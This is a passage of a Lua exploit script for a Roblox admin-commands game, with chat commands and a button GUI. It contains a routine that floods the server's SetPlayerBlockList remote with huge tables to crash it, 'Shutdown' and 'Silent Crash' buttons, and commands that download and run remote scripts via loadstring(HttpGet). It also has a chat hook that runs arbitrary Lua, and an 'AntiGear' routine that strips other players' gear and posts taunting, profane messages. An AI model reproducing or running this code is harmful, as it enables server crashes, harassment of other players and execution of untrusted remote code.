			game.Players.LocalPlayer.Backpack:WaitForChild("VampireVanquisher")
			for _, v in ipairs(Backpack:GetChildren()) do
				v.Parent = game.Players.LocalPlayer.Character
				v:Activate()
			end

			wait(.15)
			task.spawn(function()
				while scriptrunning do
					chatt("unsize me me me");task.wait()
				end
			end)

			wait(1.01)

			for i = 1, 12 do
				local table1 = {}
				local table2 = {}

				local function loop(v1, v2)
					for i = v1, v2 do
						table.insert(table1, table2)
					end
				end

				local function crash(v1)
					for i = 1, v1 do
						table.insert(table2[1], {})
					end

					if 4999999 / (v1 + 2) then
						loop(1, 4999999 / (v1 + 2))
					else
						loop(1, 4999999)
					end
					game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(table1)
				end

				table.insert(table2, {})
				game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
				crash(250)
				wait(3.51)
			end
		end)

	addcommand("iy",
		"Load up infinite yield",
		function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
		end
	)

	addcommand("classicmode",
		"Load up old SCV2",
		function()
			_G.prefix3 = "."
			logn('NEW SCV2 prefix changed to "."')
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Tech-187/Obfuscated-art/main/Legacy%20SCV2"))()
		end
	)

	addcommand("house",
		"Teleport to the house",
		function()
			chatt("invis                                                                                                                                                               me "..math.random(1,1000).." fuck")
			wait(.49)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-28.6829948, 8.2299995, 66.4913253))
			wait(.49)
			chatt("vis                                                                                                                                                               me "..math.random(1,1000).." fuck")
		end
	)

	task.spawn(function()
		for i, Plr in pairs(game.Players:GetChildren()) do
			if Plr.Name ~= game.Players.LocalPlayer.Name then
				connections[#connections + 1] = Plr.CharacterAdded:Connect(function()
					connections[#connections + 1] = game.Players[Plr.Name].Backpack.ChildAdded:connect(function()
						if antiGear == true then
							chatt("ungear " .. Plr.Name .. "                                                                                                                                                                                                                                                                                                                            others fuck " ..math.random(1, 1000))
							chatt("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Gears have been disabled for now \n cry about it if you have any complaints \n and no we don't care about your hurt feelings")
							chatt("trip " .. Plr.Name);wait(.51)
							chatt("noclip                                                                                                                        " .. Plr.Name)
						end
					end)
				end)
				connections[#connections + 1] = game.Players[Plr.Name].Backpack.ChildAdded:connect(function()
					if antiGear == true then
						chatt("ungear " .. Plr.Name .. "                                                                                                                                                                                                                                                                                                                            others fuck " ..math.random(1, 1000))
						chatt("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Gears have been disabled for now \n cry about it if you have any complaints \n and no we don't care about your hurt feelings")
						chatt("trip " .. Plr.Name);wait(.51)
						chatt("noclip                                                                                                                        " .. Plr.Name)
					end
				end)
			end
		end
		connections[#connections + 1] = game.Players.PlayerAdded:Connect(function(Plr)
			if Plr.Name ~= game.Players.LocalPlayer.Name then
				connections[#connections + 1] = Plr.CharacterAdded:Connect(function()
					connections[#connections + 1] = game.Players[Plr.Name].Backpack.ChildAdded:connect(function()
						if antiGear == true then
							chatt("ungear " .. Plr.Name .. "                                                                                                                                                                                                                                                                                                                            others fuck " ..math.random(1, 1000))
							chatt("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Gears have been disabled for now \n cry about it if you have any complaints \n and no we don't care about your hurt feelings")
							chatt("trip " .. Plr.Name);wait(.51)
							chatt("noclip                                                                                                                        " .. Plr.Name)
						end
					end)
				end)
				connections[#connections + 1] = game.Players[Plr.Name].Backpack.ChildAdded:connect(function()
					if antiGear == true then
						chatt("ungear " .. Plr.Name .. "                                                                                                                                                                                                                                                                                                                            others fuck " ..math.random(1, 1000))
						chatt("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Gears have been disabled for now \n cry about it if you have any complaints \n and no we don't care about your hurt feelings")
						chatt("trip " .. Plr.Name);wait(.51)
						chatt("noclip                                                                                                                        " .. Plr.Name)
					end
				end)
			end
		end)
	end)

	connections[#connections + 1] = game.Players.LocalPlayer.Chatted:Connect(function(msg)
		if string.sub(msg, 0, 3 + #prefix3) == prefix3.."lua" then
			local code = string.sub(msg, 5 + #prefix3)
			loadstring(code)()
		elseif string.sub(msg:lower(), 0, 5 + #prefix3) == prefix3.."unban" then
			local player = string.sub(msg:lower(), 7 + #prefix3)
			chatt("-unlock "..player)
			wait(1.5)
			chatt("respawn "..player)
			chatt("tp "..player.." me")
		elseif string.sub(msg:lower(), 0, 4 + #prefix3) == prefix3.."spam" then
			local msggg = string.sub(msg:lower(), 6 + #prefix3)
			spam = true
			while spam and scriptrunning do task.wait()
				chatt(msggg)
			end
		elseif string.sub(msg:lower(), 0, 4 + #prefix3) == prefix3.."stop" or string.sub(msg:lower(), 0, 6 + #prefix3) == prefix3.."unspam" then
			spam = false
			colors = false
			shared.spam = false
			shared.spam1 = false
			shared.spam2 = false
			_G.spamm = false
			_G.spamm2 = false
		elseif string.sub(msg:lower(), 0, 8 + #prefix3) == prefix3.."mboombox" then
			local msggg = string.sub(msg:lower(), 10 + #prefix3)
			local tlrs = game.Players.LocalPlayer.Backpack:GetDescendants()
			local plrs = game:GetService("Players")
			local chr = plrs.LocalPlayer.Character

			for i,v in pairs(tlrs) do
				coroutine.wrap(function()
					if v:IsA'Tool' then
						function rng() return math.random(-128, 128) end
						v.GripPos = Vector3.new(rng(), 1, rng());wait(0.25)
						v.Parent = chr
						wait(0.25)
						v.Remote:FireServer("PlaySong", tonumber(msggg))
					end
				end)()
			end
		end
	end)

	task.spawn(function()
		while scriptrunning do task.wait(.1)
			if
				ws:FindFirstChild(game.Players.LocalPlayer.Name) and
				ws:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("Humanoid")
			then
				local L_1_ = workspace[game.Players.LocalPlayer.Name]
				if ELFRGD == true then
					if L_1_.Humanoid.Health == 0 then
						chatt("reset me " .. math.random(1, 1000))
						chatt("reset/me " .. math.random(1, 1000))
						chatt("god                                                                                                                               me fuck " ..math.random(1, 1000))
					end
				end
			else
				repeat
					task.wait()
				until ws:FindFirstChild(game.Players.LocalPlayer.Name) and
					ws:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("Humanoid")
			end
		end
		if ELFRGD == true then
			if KGODglobal == true then
				return
			end
			pcall(
				function()
					_G.KGODglobal = true
				end
			)
			connections[#connections + 1] = game.Players.LocalPlayer.CharacterAdded:connect(function()
				task.wait(.65)
				chatt("god                                                                                                                               me fuck " ..math.random(1, 1000))
			end)
		end
	end)

	connections[#connections + 1] = rns.RenderStepped:Connect(function()
		if antiBlind == true then
			for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
				if v.Name == "EFFECTGUIBLIND" then
					v:Destroy()
				end
			end
		end
		if colors == true then
			while colors do
				chatt("fogcolor " ..
					tostring(math.random(0, 255)) ..
					" " .. tostring(math.random(0, 255)) .. " " .. tostring(math.random(0, 255)))
				Utils.Task:wait()
			end
		end
	end)

	game.StarterGui.ResetPlayerGuiOnSpawn = false



	PlayerList = Instance.new("ScreenGui")

	coroutine.wrap(function()
		-- Instances:

		local PlayerListMaster = Instance.new("Frame")
		local SizeOffsetFrame = Instance.new("Frame")
		local UIListLayout = Instance.new("UIListLayout")
		local ScrollingFrameContainer = Instance.new("Frame")
		local UIListLayout_2 = Instance.new("UIListLayout")

		--Properties:

		PlayerList.Name = "PlayerList"
		PlayerList.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
		PlayerList.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		PlayerList.DisplayOrder = 1

		PlayerListMaster.Name = "PlayerListMaster"
		PlayerListMaster.Parent = PlayerList
		PlayerListMaster.AnchorPoint = Vector2.new(1, 0)
		PlayerListMaster.BackgroundTransparency = 1.000
		PlayerListMaster.Position = UDim2.new(1, -4, 0, 40)
		PlayerListMaster.Size = UDim2.new(0, 166, 0.1, 0)

		SizeOffsetFrame.Name = "SizeOffsetFrame"
		SizeOffsetFrame.Parent = PlayerListMaster
		SizeOffsetFrame.AnchorPoint = Vector2.new(0.5, 0.5)
		SizeOffsetFrame.BackgroundTransparency = 1.000
		SizeOffsetFrame.Position = UDim2.new(0.5, 0, 0.881410241, 0)
		SizeOffsetFrame.Size = UDim2.new(1, 0, 2.5, 0) -- {1, 0},{3.003, 0}

		UIListLayout.Parent = SizeOffsetFrame
		UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

		ScrollingFrameContainer.Name = "ScrollingFrameContainer"
		ScrollingFrameContainer.Parent = SizeOffsetFrame
		ScrollingFrameContainer.BackgroundColor3 = Color3.fromRGB(31, 33, 35)
		ScrollingFrameContainer.BackgroundTransparency = 0.300
		ScrollingFrameContainer.BorderSizePixel = 0
		ScrollingFrameContainer.LayoutOrder = 3
		ScrollingFrameContainer.Position = UDim2.new(0, 0, 0.0145454546, 0)
		ScrollingFrameContainer.Size = UDim2.new(1, 0, 0.883456707, 40)

		UIListLayout_2.Parent = ScrollingFrameContainer
		UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder

		-- Scripts:

		local function KTJYHGG_fake_script()
			local script = Instance.new("LocalScript", ScrollingFrameContainer)

			function addBox(isPerm, plrName, plrDisplay)
				local PlayerHere = Instance.new("Frame")
				local ChildrenFrame = Instance.new("Frame")
				local NameFrame = Instance.new("Frame")
				local DisplayName = Instance.new("Frame")
				local PlayerName = Instance.new("TextLabel")
				local SizeConstraint = Instance.new("UITextSizeConstraint")
				local PermUI = Instance.new("Frame")
				local PlayerName_2 = Instance.new("TextLabel")
				local SizeConstraint_2 = Instance.new("UITextSizeConstraint")
				local PlayerName_3 = Instance.new("Frame")
				local PlayerName_4 = Instance.new("TextLabel")
				local SizeConstraint_3 = Instance.new("UITextSizeConstraint")
				local Layout = Instance.new("UIListLayout")

				PlayerHere.Name = plrName
				PlayerHere.Parent = script.Parent
				PlayerHere.BackgroundTransparency = 1.000
				PlayerHere.ClipsDescendants = true
				PlayerHere.Size = UDim2.new(1, 0, 0.158816129, 0)

				ChildrenFrame.Name = "ChildrenFrame"
				ChildrenFrame.Parent = PlayerHere
				ChildrenFrame.BackgroundTransparency = 1.000
				ChildrenFrame.Size = UDim2.new(1, 0, 0, 40)

				NameFrame.Name = "NameFrame"
				NameFrame.Parent = ChildrenFrame
				NameFrame.BackgroundTransparency = 1.000
				NameFrame.Size = UDim2.new(0, 150, 0, 40)

				DisplayName.Name = "DisplayName"
				DisplayName.Parent = NameFrame
				DisplayName.BackgroundTransparency = 1.000
				DisplayName.LayoutOrder = 3
				DisplayName.Position = UDim2.new(0.0799999982, 0, 0, 0)
				DisplayName.Size = UDim2.new(0.639999986, -34, 1, 0)

				PlayerName.Name = "PlayerName"
				PlayerName.Parent = DisplayName
				PlayerName.BackgroundTransparency = 1.000
				PlayerName.Position = UDim2.new(0.439606011, 0, 0.704999983, 0)
				PlayerName.Size = UDim2.new(1, 0, 0.439999998, 0)
				PlayerName.Font = Enum.Font.GothamSemibold
				PlayerName.Text = plrDisplay
				PlayerName.TextColor3 = Color3.fromRGB(255, 255, 255)
				PlayerName.TextScaled = true
				PlayerName.TextSize = 14.000
				PlayerName.TextWrapped = true
				PlayerName.TextXAlignment = Enum.TextXAlignment.Left

				SizeConstraint.Name = "SizeConstraint"
				SizeConstraint.Parent = PlayerName
				SizeConstraint.MaxTextSize = 14
				SizeConstraint.MinTextSize = 9

				PermUI.Name = "PermUI"
				PermUI.Parent = NameFrame
				PermUI.BackgroundTransparency = 1.000
				PermUI.LayoutOrder = 3
				PermUI.Position = UDim2.new(0.0799999982, 0, 0, 0)
				PermUI.Size = UDim2.new(0.446666658, -34, 1, 0)

				PlayerName_2.Name = "PlayerName"
				PlayerName_2.Parent = PermUI
				PlayerName_2.BackgroundTransparency = 1.000
				PlayerName_2.Position = UDim2.new(0, 0, 0.280000001, 0)
				PlayerName_2.Size = UDim2.new(1, 0, 0.439999998, 0)
				PlayerName_2.Font = Enum.Font.GothamSemibold
				PlayerName_2.Text = "    "
				if isPerm then
					PlayerName_2.Text = "Perm"
				end
				PlayerName_2.TextColor3 = Color3.fromRGB(255, 255, 255)
				PlayerName_2.TextScaled = true
				PlayerName_2.TextSize = 14.000
				PlayerName_2.TextWrapped = true
				PlayerName_2.TextXAlignment = Enum.TextXAlignment.Left

				SizeConstraint_2.Name = "SizeConstraint"
				SizeConstraint_2.Parent = PlayerName_2
				SizeConstraint_2.MaxTextSize = 14
				SizeConstraint_2.MinTextSize = 9

				PlayerName_3.Name = "PlayerName"
				PlayerName_3.Parent = NameFrame
				PlayerName_3.BackgroundTransparency = 1.000
				PlayerName_3.LayoutOrder = 3
				PlayerName_3.Size = UDim2.new(1, -34, 1, 0)

				PlayerName_4.Name = "PlayerName"
				PlayerName_4.Parent = PlayerName_3
				PlayerName_4.BackgroundTransparency = 1.000
				PlayerName_4.Position = UDim2.new(0.422413796, 0, 0.280000001, 0)
				PlayerName_4.Size = UDim2.new(1, 0, 0.439999998, 0)
				PlayerName_4.Font = Enum.Font.GothamSemibold
				PlayerName_4.Text = plrName
				PlayerName_4.TextColor3 = Color3.fromRGB(255, 255, 255)
				PlayerName_4.TextScaled = true
				PlayerName_4.TextSize = 14.000
				PlayerName_4.TextWrapped = true
				PlayerName_4.TextXAlignment = Enum.TextXAlignment.Left

				SizeConstraint_3.Name = "SizeConstraint"
				SizeConstraint_3.Parent = PlayerName_4
				SizeConstraint_3.MaxTextSize = 14
				SizeConstraint_3.MinTextSize = 9

				Layout.Name = "Layout"
				Layout.Parent = ChildrenFrame
				Layout.FillDirection = Enum.FillDirection.Horizontal
				Layout.SortOrder = Enum.SortOrder.Name
				Layout.VerticalAlignment = Enum.VerticalAlignment.Center
			end

			game.StarterGui:SetCoreGuiEnabled("PlayerList", false)

			connections[#connections + 1] = game.Players.ChildRemoved:Connect(function(player)
				if script.Parent:FindFirstChild(player.Name) then
					script.Parent:FindFirstChild(player.Name):remove()
				end
			end)

			while wait(.65) do
				for _, plr in pairs(game.Players:GetChildren()) do
					if not script.Parent:FindFirstChild(plr.Name) then
						addBox(hasGamepass(plr.UserId, 66254 or 64354), plr.Name, plr.DisplayName)
						task.wait()
						--script.Parent.Size = UDim2.new(0, 166, 0, (#script.Parent:GetChildren() - 1) * 50)
					end
				end
			end
		end
		coroutine.wrap(KTJYHGG_fake_script)()
	end
	)()

	-- Instances:

	local SCv2_ButtonList = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	local ScrollingFrame = Instance.new("ScrollingFrame")
	local UIGridLayout = Instance.new("UIGridLayout")
	local UICorner = Instance.new("UICorner")
	local CloseUI = Instance.new("TextButton")
	local UICorner_2 = Instance.new("UICorner")

	--Properties:

	SCv2_ButtonList.Name = "SCv2_ButtonList"
	SCv2_ButtonList.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	SCv2_ButtonList.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	Frame.Parent = SCv2_ButtonList
	Frame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
	Frame.BorderColor3 = Color3.fromRGB(33, 33, 33)
	Frame.Position = UDim2.new(0.137755096, 0, 0.319999993, 0)
	Frame.Size = UDim2.new(0, 262, 0, 25)

	ScrollingFrame.Parent = Frame
	ScrollingFrame.Active = true
	ScrollingFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
	ScrollingFrame.BorderColor3 = Color3.fromRGB(33, 33, 33)
	ScrollingFrame.BorderSizePixel = 0
	ScrollingFrame.Position = UDim2.new(0.0152671756, 0, 1, 0)
	ScrollingFrame.Size = UDim2.new(0, 254, 0, 300)
	ScrollingFrame.CanvasSize = UDim2.new(1, 0, 3, 0)

	UIGridLayout.Parent = ScrollingFrame
	UIGridLayout.CellSize = UDim2.new(1, -10, 0, 25)

	UICorner.CornerRadius = UDim.new(0, 2)
	UICorner.Parent = Frame

	CloseUI.Name = "CloseUI"
	CloseUI.Parent = Frame
	CloseUI.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
	CloseUI.BackgroundTransparency = 1.000
	CloseUI.BorderColor3 = Color3.fromRGB(33, 33, 33)
	CloseUI.Position = UDim2.new(0.904511452, 0, -0.0300000012, 0)
	CloseUI.Size = UDim2.new(0, 25, 0, 25)
	CloseUI.Font = Enum.Font.SourceSans
	CloseUI.Text = "X"
	CloseUI.TextColor3 = Color3.fromRGB(0, 0, 0)
	CloseUI.TextSize = 14.000

	UICorner_2.CornerRadius = UDim.new(0, 2)
	UICorner_2.Parent = CloseUI

	-- Scripts:

	local function NKEI_fake_script() -- ScrollingFrame.LocalScript 
		script = Instance.new('LocalScript', ScrollingFrame)

		local ClrPlt = {
			DefBk = Color3.fromRGB(33, 33 ,33),
			Enabled = Color3.fromRGB(44, 44, 44),
		}

		function addBtn(text, callback)
			local btn = Instance.new("TextButton", script.Parent)
			btn.BackgroundColor3 = ClrPlt.DefBk
			btn.BorderSizePixel = 0
			btn.Size = UDim2.new(0, 254, 0, 25)
			btn.Text = text
			btn.Name = text -- Order
			btn.TextSize = 14.000
			btn.TextColor3 = Color3.fromRGB(255, 255, 255)
			btn.MouseButton1Click:Connect(function()
				callback(btn)
			end)
		end

		function addTlg(text, callback_e, callback_d)
			addBtn(text, function(self)
				if self.BackgroundColor3 == ClrPlt.DefBk then
					self.BackgroundColor3 = ClrPlt.Enabled
					callback_e(self)
				else
					self.BackgroundColor3 = ClrPlt.DefBk
					callback_d(self)
				end
			end)
		end

		-- UI

		addTlg("Loopgrab/PadAbuse", function()
			padAbuse = true
		end, function()
			padAbuse = false
		end)

		addTlg("ClickExplode", function()
			clickExplode = true
		end, function()
			clickExplode = false
		end)

		addTlg("Visualizer", function()
			chatt("fogcolor 255 255 0")
			soundvis = true
			chatt("time 0")
			game:GetService("Workspace").Terrain["_Game"].Folder:WaitForChild("Sound")
			local loud = game:GetService("Workspace").Terrain["_Game"].Folder.Sound.PlaybackLoudness
			repeat
				if loud > 75 then
				else
					if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
						chatt("fogend "..game:GetService("Workspace").Terrain["_Game"].Folder.Sound.PlaybackLoudness / 4)
					else
					end
				end;wait()
			until soundvis == false
		end, function()
			soundvis = false
		end)

		addTlg("ClickAnnoy", function()
			clickAnnoy = true
			logn("Type //stop to stop it")
		end, function()
			clickAnnoy = false
		end)

		addTlg("ClickFard", function()
			clickFard = true
		end, function()
			clickFard = false
		end)

		addBtn("Stop spam", function(v)
			spam = false
			colors = false
			shared.spam = false
			shared.spam1 = false
			shared.spam2 = false
			_G.spamm = false
			_G.spamm2 = false
		end)

		addBtn("DeleteResetPad", function(v)
			chatt(prefix3.."deleteregen")
		end)

		addBtn("RainbowPads", function(v)
			local speed = 32
			chatt("gear me "..antilog.."18474459")
			wait(1)
			game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.PaintBucket)
			wait(0.25)
			while true do
				for i = 0,1,0.001*speed do
					local clr = Color3.fromHSV(i,1,1)
					local padss = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
					for i, v in pairs(padss) do
						local jkfv = v.Head
						coroutine.wrap(function()
							if jkfv:IsA("Part") then
								local v1 =
									{
										["Part"] = jkfv,
										["Color"] = clr
									}
								game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", v1)
							end
						end)()
					end
					wait(1 / 12) -- recolor the map x times a second lol.
				end
			end
		end)

		addBtn("Shutdown", function(v)
			chatt(prefix3.."vgcrash")
		end)

		addBtn("Silent Crash", function(v)
			chatt(prefix3.."silcrash")
		end)

		addBtn("House TP", function(v)
			chatt(prefix3.."house")
		end)

		addBtn("ServerHop", function(v)
			local x = {}
			for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/112420803/servers/Public?sortOrder=Asc&limit=100")).data) do
				if type(v) == "table" and v.maxPlayers > v.playing then
					x[#x + 1] = v.id
					amount = v.playing
				end
			end
			if #x > 0 then
				game:GetService("TeleportService"):TeleportToPlaceInstance(112420803, x[math.random(1, #x)])
			end
		end)

		addBtn("RegenPads", function(v)
			fireclickdetector(adminFlr.Regen.ClickDetector, 0)
		end)

		addBtn("NoObbyKill (NOK)", function(v)
			local objs = gameFlr.Workspace.Obby:GetChildren()
			for i, obj in pairs(objs) do
				coroutine.wrap(function()
					pcall(function()
						obj.TouchInterest:Destroy()
					end)
				end)()
			end
		end)

		addBtn("AntiPunish", function(v)
			if gamepassperm then
				chatt(prefix3.."permap")
			else
				chatt(prefix3.."nonpermap")
			end
		end)

		addBtn("*Commands", function(v)
			chatt(prefix3.."cmds")
		end)

		addBtn(
			"*Instant /c system",
			function(v)
				local invisGUIS = {}
				Players = game:GetService("Players")

				function FindInTable(tbl, val)
					if tbl == nil then
						return false
					end
					for _, v in pairs(tbl) do
						if v == val then
							return true
						end
					end
					return false
				end

				for i, v in pairs(Players.LocalPlayer:FindFirstChildWhichIsA("PlayerGui"):GetDescendants()) do
					if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and not v.Visible then
						v.Visible = true
						if not FindInTable(invisGUIS, v) then
							table.insert(invisGUIS, v)
						end
					end
				end
			end
		)

		local ELFRGD = false
		addTlg("AntiKill", function()
			chatt(prefix3.."antikill")
		end, function()
			chatt(prefix3.."unantikill")
		end)

		addTlg("AntiBlind", function()
			antiBlind = true
		end, function()
			antiBlind = false
		end)

		addTlg("AntiGear", function()
			antiGear = true
		end, function()
			antiGear = false
		end)

		local OELRDC = false
		addTlg("AutoHeal", function()
			OELRDC = true
			coroutine.wrap(function()
				pcall(function()
					while OELRDC and scriptrunning do wait(0.50)
						local hlth = game.Players.LocalPlayer.Character.Humanoid.Health
						if hlth ~= 0 and hlth ~= 100 then
							chatt("heal me 100")
						end
					end
				end)
			end)()
		end, function()
			OELRDC = false
		end)

		local size = UIGridLayout.AbsoluteContentSize -- Set GUI Virutal size
		ScrollingFrame.CanvasSize = UDim2.new(0, size.X, 0, size.Y)
	end
	coroutine.wrap(NKEI_fake_script)()
	local function QIQVS_fake_script() -- CloseUI.LocalScript 
		script = Instance.new('LocalScript', CloseUI)

		script.Parent.MouseButton1Click:Connect(function()
			scriptrunning = false
			chatt("v!noeditor")
			chatt(prefix3.."noplayerlist");wait(.35)
			pcall(function()
				script.Parent.Parent.Parent:Destroy()
				game:GetService("StarterGui"):SetCoreGuiEnabled("PlayerList", true)
				PlayerList:Destroy()
			end)
			wait(.35)
			for _, connection in ipairs(connections) do
				connection:Disconnect()
			end
		end)
	end
	coroutine.wrap(QIQVS_fake_script)()
	local function VGXONZ_fake_script() -- Frame.MguiD 
		local script = Instance.new('LocalScript', Frame)

		local UserInputService = game:GetService("UserInputService")

		local gui = script.Parent

		local dragging
		local dragInput
		local dragStart
		local startPos

		local function update(input)
			local delta = input.Position - dragStart
			gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		end

		gui.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				dragStart = input.Position
				startPos = gui.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end)

		gui.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)

		UserInputService.InputChanged:Connect(function(input)
			if input == dragInput and dragging then
				update(input)
			end
		end)
	end
	coroutine.wrap(VGXONZ_fake_script)()
	local function EAZWOTE_fake_script() -- SCv2_ButtonList.MguiD 
		local script = Instance.new('LocalScript', SCv2_ButtonList)

		local UserInputService = game:GetService("UserInputService")

		local gui = script.Parent

		local dragging
		local dragInput
		local dragStart
		local startPos

		local function update(input)
			local delta = input.Position - dragStart
			gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		end

		gui.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				dragStart = input.Position
				startPos = gui.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end)

		gui.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)

		UserInputService.InputChanged:Connect(function(input)
			if input == dragInput and dragging then
				update(input)
			end
		end)
	end
	coroutine.wrap(EAZWOTE_fake_script)()
end

function mod:LoadJotunnheim()
	local function tchat(ch)
		workspace.ChatWindow_MessagePosted:fire(ch)
	end
	local Players = game:GetService("Players")


	print("Successfully executed commands")

	local plr = game.Players.LocalPlayer

	local blg = {}
	local god = false
	local gr = "VampireVanquisher"
	local spam = false
	local paint1 = false
	local paint2 = false
	local paint3 = false
	local disco = false
	local paint4 = false
	local paint5 = false
	local paint6 = false
	local paint7 = false
	local paint8 = false
	local paint9 = false
	local paint10 = false
	local paint11 = false
	local spam = false
	local vis = false
	local paint12 = false
	local ff = false
	_G.antigears = false
	_G.antisize = false
	local msgdeleter = false
	local antilag = false
	local plrs = game:GetService("Players")
	local plr = plrs.LocalPlayer
	local Plrname = plr.Name
	local plrgui = plr.PlayerGui
	local name = plr.Name
	local cha = plr.Character
	local time = 0.00000000000000000000000000000000001
	local Folder = game:GetService("Workspace").Terrain["_Game"].Folder
	local uis = game:GetService("UserInputService")
	local RunService = game:GetService("RunService")
	local rs = game:GetService("ReplicatedStorage")
	local tp = game:GetService("TeleportService")
	local UIS = game:GetService("UserInputService")
	local MouseDown = false
	local mouse = game.Players.LocalPlayer:GetMouse()
	_G.i = 1
	local folder = game:GetService("Workspace").Terrain["_Game"].Folder
	local parts = {}
	local ws = Folder.Parent.Workspace
	local hookmusic = false
	local red = false
	local blue = false
	local green = false
	local auto = true
	local cyan = false
	local black = false
	local magenta = false
	local brown = false
	local light_gray = false
	local dark_gray = false
	local light_blue = false
	local light_green = false
	local light_cyan = false
	local light_red = false
	local light_magenta = false
	local yellow = false
	local white = false
	local rainbow = false
	local hide = "                                                                  "
	local Admin = ws.Parent.Admin
	local foundregen = false
	local Pads = Admin.Pads
	local ad = ws["Admin Dividers"]
	local house = ws["Basic House"]
	local obby = ws.Obby
	local obbybox = ws["Obby Box"]
	local bricks = ws["Building Bricks"]
	local myjail = name .. "'s jail"
	local getplrs = plrs:GetChildren()
	local antiabuse = false
	local antijail = false
	_G.antifreeze = false
	local antikill = false
	local antifling = false
	local antipunish = false
	local antiblind = false
	local textcolor = false
	_G.takepads = false
	local takeallpads
	local hide = false
	local zero =
		"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
	local padbanned = {}

	local function clickiv()
		local iv = game:GetService("Players").LocalPlayer.Backpack:WaitForChild("IvoryPeriastron")
		iv.Parent = plr.Character
		repeat
			game:GetService("RunService").Heartbeat:wait()
		until iv:FindFirstChild("Remote")
		local Remote = iv:FindFirstChild("Remote")
		Remote:FireServer(Enum.KeyCode.E)
		Remote:FireServer(Enum.KeyCode.E)
		Remote:FireServer(Enum.KeyCode.E)
		Remote:FireServer(Enum.KeyCode.E)
		iv:Activate()
	end

	_G.prefix = "/"

	local admin = {prefix = _G.prefix, version = "1.0"}
	local commands = {}
	local descriptions = {}
	local http = game:GetService("HttpService")
	-- functions:
	function addcommand(cmdName, cmdDescription, cmdFunction)
		commands[cmdName] = cmdName
		descriptions[cmdName] = cmdDescription
		plr.Chatted:Connect(
			function(msg)
				msg = msg:lower()
				args = msg:split(" ")
				if args[1] == admin.prefix .. cmdName then
					cmdFunction()
				elseif args[1] == "/e" and args[2] == admin.prefix .. cmdName then
					args[2] = args[3]
					cmdFunction()
				end
			end
		)
	end

	function newHumanoid()
		Instance.new("Humanoid", plr.Character)
	end

	function GetPlayer(target)
		local plrs = game:service("Players"):GetPlayers()
		if target:lower() == "all" then
			return plrs
		elseif target:lower() == "others" then
			for index, plr in pairs(plrs) do
				if plr == game:service("Players").LocalPlayer then
					table.remove(plrs, index)
					return plrs
				end
			end
		elseif target:lower() == "me" then
			return {game:service("Players").LocalPlayer}
		else
			local plrTargets = {}
			for index, plr in pairs(plrs) do
				if plr.Name:sub(1, #target):lower() == target:lower() or plr.DisplayName:sub(1, #target):lower() == target:lower() then
					table.insert(plrTargets, plr)
				end
			end
			return plrTargets
		end
	end
	--// commands


	addcommand("bbox", "", function()
		tchat("gear me 212641536")-- 1837881688
		plr.Backpack:WaitForChild("SuperFlyGoldBoombox").Parent = plr.Character
	end)

	addcommand("chiefkeef", "", function()
		local chiefkeif = "CHIEFKEEFHAXXX STATUS: LOADED"
		while task.wait(1.1) do

			tchat("h/\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"..chiefkeif.."\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
		end
	end)

	addcommand("superbbox", "", function()
		-- for i = 1, 5 do
		for i = 1, 200 do
			tchat("gear me 212641536")-- 1837881688
		end 
		task.wait(.7)
		for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
			coroutine.wrap(function()
				pcall(function()
